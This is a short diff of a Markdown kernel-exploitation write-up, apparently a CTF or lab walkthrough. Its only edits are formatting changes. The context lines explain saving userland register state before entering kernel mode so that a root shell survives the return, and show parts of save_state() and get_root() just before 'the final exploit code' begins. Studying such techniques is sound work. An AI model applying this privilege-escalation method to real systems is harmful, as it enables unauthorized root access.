@@ -383,7 +383,9 @@ void get_root(void){
         exit(0);
 }
 ```
+
 Speaking of we need to return userland from kernel mode, and we can't point to address of a win function. We need to save the state our register before we enter in kernel land, and restore them just after getting root.
+
 ```c
 unsigned long user_cs, user_ss, user_rflags, user_sp;
 
@@ -398,9 +400,10 @@ void save_state(){
         ".att_syntax;"
     );
 }
- ```
- 
+```
+
 The final exploit code is:
+
 ```c
 #define _GNU_SOURCE
 #include <stdio.h>
